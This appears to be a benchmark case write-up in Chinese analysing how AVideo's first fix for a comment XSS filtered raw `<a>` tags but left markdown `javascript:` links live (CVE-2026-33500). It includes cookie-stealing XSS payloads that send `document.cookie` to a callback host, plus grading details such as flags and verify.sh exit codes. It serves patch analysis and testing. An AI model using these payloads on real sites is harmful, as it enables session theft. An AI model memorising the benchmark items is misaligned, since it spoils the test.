# AVideo：sanitizeATag 只拦了裸 HTML，markdown 链接还走 Parsedown 核心

- Case：`PCBV2-0082`
- 产品：AVideo（WWBN/AVideo，PHP 视频站；评论走 `markDownToHTML()`）
- 链：CVE-2026-27568（GHSA-rcqw-6466-3mv7，v21.0，commit `f154167251`）→ CVE-2026-33500（GHSA-72h5-39r7-r26j，≤26.0，commit `3ae02fa2409`）
- 源码对着 `f154167251c9cf183ce09cd018d07e9352310457` 的 `objects/functionsSecurity.php`：`ParsedownSafeWithLinks::sanitizeATag` / `inlineMarkup` / `markDownToHTML`，以及同 commit 的 `vendor/erusev/parsedown/Parsedown.php`：`inlineLink`、`element`、`sanitiseElement`、`filterUnsafeUrlInAttribute`。运行时是整仓 clone，不是抽出来的函数。

2026 年 2 月，AVideo 用自定义 `ParsedownSafeWithLinks` 替换裸 `Parsedown`，想挡住评论里的 `javascript:` 链接。`sanitizeATag()` 只认裸 HTML `<a href="...">`。一个月后 GHSA-72h5-39r7-r26j 写明：markdown `[text](javascript:...)` 走 Parsedown 核心 `inlineLink()`，**不经过** `sanitizeATag`；同时 `setSafeMode(false)` 把 Parsedown 自带的 `sanitiseElement()` 也关掉了。NVD CVE-2026-33500 原话就是 *the fix for CVE-2026-27568 ... sanitizes raw HTML ... but explicitly disables Parsedown's safeMode*。

根因不只是「正则没覆盖 markdown」。检查插在「原始 HTML 标签长什么样」这一层；真正写出 `<a href>` 的是 `inlineLink` → `element()`；同文件里已经有一份 scheme 白名单，却只挂在 `sanitizeATag` 上。下面按评论走进去、V1 改了哪几行、消毒后谁消费那个 href、更强的 safeMode / `inlineLink` 覆盖为什么没用上，把这几层写完。

---

## 这块功能本来在干什么

AVideo 评论允许 Markdown。服务端 `markDownToHTML($text)` 把用户字符串变成 HTML，嵌进视频页。一次典型请求：

```http
POST /comment
comment = "see [docs](https://example.com)"
```

页面渲染时再 `GET /`，受害者浏览器看到 `<a href="https://example.com">docs</a>`。本 case 的 flag 种在无头 Chromium 受害者的 cookie（`session=<FLAG>`），**不在** HTML 里。只有真正执行的 `javascript:` href（受害者点击）才能读 `document.cookie` 并 POST 到内部 callback。

设计意图：评论里可以有链接和图片，但不能有 `javascript:` / `vbscript:` / `data:`。成功穿越之后的效果是：**页面上出现可点击的 `javascript:` 锚点，点击后 cookie 里的金丝雀出现在 callback dump**。

数据流：

```text
HTTP POST comment
    → 入库
    → GET / 渲染
         markDownToHTML(text)
              new ParsedownSafeWithLinks()
              setSafeMode(false)          ← 故意关掉核心过滤
              setMarkupEscaped(false)
              $parsedown->text($text)
                   裸 HTML <a>  → inlineMarkup → sanitizeATag   ← V1 补丁插在这里
                   markdown [x](url) → Parsedown::inlineLink     ← 不经过 sanitizeATag
                        element() 拼 <a href="...">
         HTML → 受害者点击
         javascript: 读 cookie → callback → PCBFLAG_...
```

评论身份是普通用户。判断完全信任「自定义 sanitizer 已经处理了所有会变成 `<a>` 的路径」。

---

## 原始漏洞：裸 HTML `javascript:`（CVE-2026-27568，pre-21.0）

V0（commit `3905f03df0`）的 `markDownToHTML` 是 `new Parsedown()`，Parsedown 1.7.4，`safeMode` 默认关，`markupEscaped` 关。裸 HTML 和 markdown 链接都会把 `javascript:` 原样写进 href。

本 case 的 seed：

```text
<a href='javascript:document.location="//callback:9000/c?f="+document.cookie'>CLICKME</a>
```

V0 原样输出这个锚点。受害者点击后 callback dump 里出现 `PCBFLAG_...`。没有「必须是管理员」的门槛，能发评论即可。

当时也没有自定义 subclass。Parsedown 自带的 `sanitiseElement()` 只在 `safeMode === true` 时由 `element()` 调用，V0 根本不会走进去。

---

## 维护者改了什么（CVE-2026-27568 修复，commit f154167251）

中间曾有过 `ade348ed6`：`setSafeMode(true)`，激活 Parsedown 自己的 scheme 过滤。随后 `f13587c59` / `f154167251` 换成自定义 subclass，并把 safeMode **关回去**，理由是要让 override 控制哪些标签能过。本 case 的 V1 就是 `f154167251`。对着官方 blob：

```php
// objects/functionsSecurity.php :: ParsedownSafeWithLinks::sanitizeATag
// (WWBN/AVideo@f154167251)
    private static function sanitizeATag($rawAttrs)
    {
        $href = '';
        $target = '';
        if (preg_match('/\bhref\s*=\s*"([^"]*)"|\bhref\s*=\s*\'([^\']*)\'/i', $rawAttrs, $m)) {
            $url = $m[2] !== '' ? $m[2] : $m[1];
            if (preg_match('/^(https?:\/\/|mailto:|\/|#)/i', $url)) {
                $href = ' href="' . htmlspecialchars($url, ENT_QUOTES) . '"';
            }
        }
        // ... target=_blank 白名单 ...
        return '<a' . $href . $target . '>';
    }
```

`inlineMarkup` 只匹配**源码里已经是标签**的片段：

```php
// objects/functionsSecurity.php :: ParsedownSafeWithLinks::inlineMarkup
    protected function inlineMarkup($Excerpt)
    {
        // Closing </a>
        if (preg_match('/^<\/a[ ]*>/i', $Excerpt['text'], $m)) { ... }

        // <a ...>
        if (preg_match('/^<a(\s[^>]*)>/i', $Excerpt['text'], $m)) {
            return ['markup' => self::sanitizeATag($m[1]), 'extent' => strlen($m[0])];
        }
        // <img ...> → sanitizeImgTag
        // 其它 inline HTML：return null（交给父类转义）
    }
```

`markDownToHTML` 把 parser 换成 subclass，并**明确**关掉 safeMode：

```php
// objects/functionsSecurity.php :: markDownToHTML  (f154167251)
function markDownToHTML($text) {
    $parsedown = new ParsedownSafeWithLinks();
    $parsedown->setSafeMode(false);
    $parsedown->setMarkupEscaped(false);
    $html = $parsedown->text($text);
    // nl2br、裸 URL linkify、给 markdown 图片加 class ...
    return $html;
}
```

V1 **没有** `inlineLink()` override。注释写「safeMode OFF so our overrides govern filtering」，但 override 只覆盖了 `blockMarkup` / `inlineMarkup`。

对 seed 这种裸 `<a href='javascript:...'>`，它确实够用：`sanitizeATag` 的白名单不认 `javascript:`，输出变成 `<a>CLICKME</a>`（没有 href）。点击无操作，callback 没有 FLAG。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 危险链接长得像源码里的 `<a href="...">` / `<a href='...'>`。
2. 关掉 safeMode 没关系，因为自定义 sanitizer 会处理所有会变成锚点的输入。

第二点不成立。Markdown 链接语法根本不会走进 `inlineMarkup`。

---

## 消毒之后，谁真正写出那个 href

Markdown `[CLICKME](javascript:...)` 由父类 `Parsedown::inlineLink` 解析。V1 的 Parsedown 是 vendored 1.8.0。`inlineLink` 把括号里的 URL **原样**放进 element 数组，没有 scheme 检查：

```php
// vendor/erusev/parsedown/Parsedown.php :: inlineLink  (AVideo@f154167251)
    protected function inlineLink($Excerpt)
    {
        $Element = array(
            'name' => 'a',
            'attributes' => array(
                'href' => null,
                'title' => null,
            ),
            // ...
        );
        // ... 匹配 [text] ...
        if (preg_match('/^[(]\s*+((?:[^ ()]++|[(][^ )]+[)])++)(?:[ ]+("[^"]*+"|\'[^\']*+\'))?\s*+[)]/', $remainder, $matches))
        {
            $Element['attributes']['href'] = $matches[1];
            // ...
        }
        // 返回 element 数组，交给 element() 序列化
    }
```

真正拼 HTML 的是 `element()`。scheme 过滤只在 `safeMode` 为真时才会跑：

```php
// vendor/erusev/parsedown/Parsedown.php :: element  (约 L1619–1624)
    protected function element(array $Element)
    {
        if ($this->safeMode)
        {
            $Element = $this->sanitiseElement($Element);
        }
        // ... 拼 <a href="..."> ...
    }
```

V1 刚把 `$this->safeMode` 设成 false，所以 `sanitiseElement` → `filterUnsafeUrlInAttribute`（把非白名单 scheme 的 `:` 换成 `%3A`）**一次都不会调用**。过滤器刚看过的是裸 HTML 属性字符串；序列化看到的是 markdown 解析器构造的 element。两套路径中间没有第二次谓词。

受害者拿到的 HTML 里仍是 `<a href="javascript:document.location=...">CLICKME</a>`。点击后 cookie 金丝雀进 callback。依据就是这一步，而不是「评论里碰巧有个同名的裸标签」。

---

## 仓库里已经有更强的检查，markdown 路径没用

同一份 Parsedown 里已经有专门拦危险 scheme 的函数：

```php
// vendor/erusev/parsedown/Parsedown.php :: sanitiseElement / filterUnsafeUrlInAttribute
    protected function sanitiseElement(array $Element)
    {
        static $safeUrlNameToAtt = array(
            'a' => 'href',
            'img' => 'src',
        );
        if (isset($safeUrlNameToAtt[$Element['name']]))
        {
            $Element = $this->filterUnsafeUrlInAttribute($Element, $safeUrlNameToAtt[$Element['name']]);
        }
        // ... 剥 on* 属性 ...
    }

    protected function filterUnsafeUrlInAttribute(array $Element, $attribute)
    {
        foreach ($this->safeLinksWhitelist as $scheme) {
            if (self::striAtStart($Element['attributes'][$attribute], $scheme)) {
                return $Element;
            }
        }
        $Element['attributes'][$attribute] = str_replace(':', '%3A', $Element['attributes'][$attribute]);
        return $Element;
    }
```

谁调用它：

| 路径 | 调用 `sanitiseElement`？ |
|---|---|
| `element()` 且 `safeMode === true` | 是，`javascript:` 变成 `javascript%3A` |
| V1 `markDownToHTML`（`setSafeMode(false)`） | **否** |
| V1 `sanitizeATag` | 自己做了一份更窄的白名单，但只服务 `inlineMarkup` |

V1 等于在调用方又做了一个**更窄**的字符串白名单（只认裸 `<a>` 属性），而 markdown 路径上那个「任意非白名单 scheme 都改 `%3A`」的检查被自己关掉了。不是仓库里没有更好的谓词，是 **safeMode 被关、inlineLink 没覆盖**。

即便 `[x](javascript:)` 没有打穿 `sanitizeATag`（它本来就不会走进去），只要 `element()` 继续裸拼 href，任何让 markdown 产出 `javascript:` 的写法都会变成一次真实的点击 XSS。

GHSA-72h5 也写了另一条更强的修复建议：重新打开 `safeMode(true)`，再用后处理把白名单标签塞回去。V1 两样都没做。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「过滤器 vs 序列化」落到具体代码：

- `sanitizeATag`：看源码里有没有 `<a href="...">` 这种**字面子串**，再配 `^(https?://|mailto:|/|#)`
- `inlineLink` + `element()`：看 markdown 括号里的 URL 原样进不进 `href="..."`

只要构造一种输入，使「变成 `<a>` 的过程不经过 `inlineMarkup`」，第一行不会跑，第二行仍然写出活的 `javascript:`。

`[CLICKME](javascript:document.location="..."+document.cookie)` 就是这样来的：

```text
输入:  [CLICKME](javascript:document.location="//callback:9000/c?f="+document.cookie)

inlineMarkup：开头不是 <a，不匹配

inlineLink：href = javascript:document.location="//callback:9000/c?f="+document.cookie

element()：safeMode=false，不 sanitise
输出:  <a href="javascript:document.location=&quot;//callback:9000/c?f=&quot;+document.cookie">CLICKME</a>
```

（HTML 属性会 escape 引号，但不改 scheme。点击时浏览器仍当 `javascript:` 执行。）

这正是 V0 上 seed 用过的那种活锚点，只是入口从裸 HTML 换成 markdown。过滤器认为自己已经把 `javascript:` 清干净了，实际上它只扫了另一条语法。

---

## 残余仍然走同一条评论 HTML 路径（CVE-2026-33500）

没有换接口、没有换身份、没有换 `markDownToHTML`。还是 POST 评论、GET 渲染、受害者点击。payload 换成：

```text
[CLICKME](javascript:document.location="//callback:9000/c?f="+document.cookie)
```

`markDownToHTML` 仍然 `new ParsedownSafeWithLinks()` + `setSafeMode(false)`。V1 的 `sanitizeATag` 照样执行不到；`inlineLink` 照样写出 href；点击后 callback dump 出现 `PCBFLAG_...`。

本 case `verify.sh` 的 residual 把 candidate 写死在脚本里：

```text
payload = '[CLICKME](javascript:document.location="//callback:9000/c?f="+document.cookie)'
```

和 GHSA-72h5 的 PoC 同一构造。认证：v1 + `--residual` 退出码 0，callback 中观察到 `RUN_FLAG`。oracle 写明 seed 和 residual 落在**同一个** `<a href>` sink，只是 Parsedown 代码路径不同（`inlineMarkup` vs `inlineLink`）。

所以残余不是新洞面，而是同一 sink 上三件事叠在一起：自定义 sanitizer 的匹配语言比「所有会变成锚点的语法」窄；真正序列化发生在检查之后的另一条方法；核心 `sanitiseElement` 被 `setSafeMode(false)` 关掉。seed 被挡住只说明「裸 `<a href='javascript:'>` 没了」，不说明「评论里不能再放出可执行的 javascript: 链接」。

---

## 后来又补了什么（CVE-2026-33500，commit 3ae02fa2409）

V2 在同一个 subclass 里覆盖 `inlineLink`，对 markdown 产出的 href 套**同一份**白名单：

```php
// objects/functionsSecurity.php :: ParsedownSafeWithLinks::inlineLink
// (WWBN/AVideo@3ae02fa2409)
    protected function inlineLink($Excerpt)
    {
        $Link = parent::inlineLink($Excerpt);
        if ($Link === null) {
            return null;
        }
        $href = isset($Link['element']['attributes']['href'])
            ? $Link['element']['attributes']['href'] : '';
        if ($href !== '' && !preg_match('/^(https?:\/\/|mailto:|\/|#)/i', $href)) {
            $Link['element']['attributes']['href'] = '';
        }
        return $Link;
    }
```

对残余输入：`javascript:...` 不匹配白名单，href 被置空，输出 `<a href="">CLICKME</a>`，点击无操作。公开建议是打上 `3ae02fa2409`（其 parent 就是 V1 的 `f154167251`）。

即便如此，`setSafeMode` 仍是 false。对 `[x](javascript:)` 这条已知链它够用；若还有其它不走 `inlineLink` / `inlineMarkup` 却仍能写出 URL 的 Parsedown 入口（例如某些扩展），需要另证。本 benchmark 的 v2 只关闭这一条 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是「源码里已经是 `<a>` 的字符串」。真正放出活链接的是 `inlineLink` 构造的 element。V2 仍在同一层加码（再覆盖一个方法），没有重新打开 `sanitiseElement` 这条对所有 `<a>` 都生效的路径。

**不是没有更好的谓词。**  
`filterUnsafeUrlInAttribute` 会把非白名单 scheme 的冒号改成 `%3A`，比 V1 那份只扫裸标签的正则更接近「所有锚点都安全」。它已经写在 Parsedown 核心里。从 V1 的 diff 只能看到加了 `ParsedownSafeWithLinks`；要判断补丁是否闭合，必须看到 `inlineLink` 和 `element()` 里那次 `if ($this->safeMode)`。

**同一函数、同一 `$text`，只换了链接写法。**  
任何把用户字符串传进 `markDownToHTML()` 的地方（评论、描述），在 f154167251 上都吃 `sanitizeATag` 和同一次未覆盖的 `inlineLink`。

**safeMode 被关掉是有意的。**  
注释写要让 override 管过滤。关掉之后，核心过滤整条死掉，override 又漏了 markdown。若 topic 只允许 `safeMode(true)` 再后处理白名单标签，后面那份 `sanitizeATag` 根本不会被逼去近似「所有链接」。

**金丝雀在 cookie 里、不在 HTML 里是有意的。**  
callback 能读到它，说明浏览器真的执行了 `javascript:`，而不是页面反射了 FLAG 字符串。

---

## 版本、入口、参考

| | commit | `markDownToHTML` | 裸 `<a href='javascript:'>` seed | markdown `[x](javascript:)` residual |
|---|---|---|---|---|
| V0 | `3905f03df0` | 裸 Parsedown 1.7.4，safeMode 关 | 活锚点，exfil | （不必） |
| V1 | `f154167251` | `ParsedownSafeWithLinks`，`sanitizeATag`，无 `inlineLink` override，safeMode 关 | href 被剥 | 活锚点，exfil |
| V2 | `3ae02fa2409` | 同上 + `inlineLink()` 白名单 | 挡 | href 置空，挡 |

- Web：评论 POST → 页面 GET → 受害者点击
- 认证（本平台）：v0 seed 观察到 flag；v1 seed 未观察到；v1 residual 观察到。
- [CVE-2026-27568](https://github.com/advisories/GHSA-rcqw-6466-3mv7)、[CVE-2026-33500](https://nvd.nist.gov/vuln/detail/CVE-2026-33500)
- [GHSA-72h5-39r7-r26j](https://github.com/WWBN/AVideo/security/advisories/GHSA-72h5-39r7-r26j)
- V1 源码：[`functionsSecurity.php` @ `f154167251`](https://github.com/WWBN/AVideo/blob/f154167251c9cf183ce09cd018d07e9352310457/objects/functionsSecurity.php)
- V2 commit：[`3ae02fa2409`](https://github.com/WWBN/AVideo/commit/3ae02fa240939dbefc5949d64f05790fd25d728d)
